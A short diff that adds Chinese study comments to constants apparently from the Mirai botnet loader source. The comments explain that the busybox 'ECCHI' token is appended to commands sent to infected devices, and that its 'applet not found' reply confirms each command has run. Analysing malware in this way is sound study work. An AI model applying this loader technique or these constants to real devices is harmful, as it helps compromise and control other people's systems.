@@ -24,8 +24,8 @@ typedef uint16_t port_t;
 #define VERIFY_STRING_HEX   "\\x6b\\x61\\x6d\\x69"
 #define VERIFY_STRING_CHECK "kami"
 
-#define TOKEN_QUERY     "/bin/busybox ECCHI"
-#define TOKEN_RESPONSE  "ECCHI: applet not found"
+#define TOKEN_QUERY     "/bin/busybox ECCHI"　　//ECCHI感觉是随便写的一串字符串
+#define TOKEN_RESPONSE  "ECCHI: applet not found"　//在每一次执行命令后都加上ECCHI，执行完后就可以查找"ECCHI: applet not found"字符串，找到说明前面的命令已经执行
 
 #define EXEC_QUERY     "/bin/busybox IHCCE"
 #define EXEC_RESPONSE  "IHCCE: applet not found"
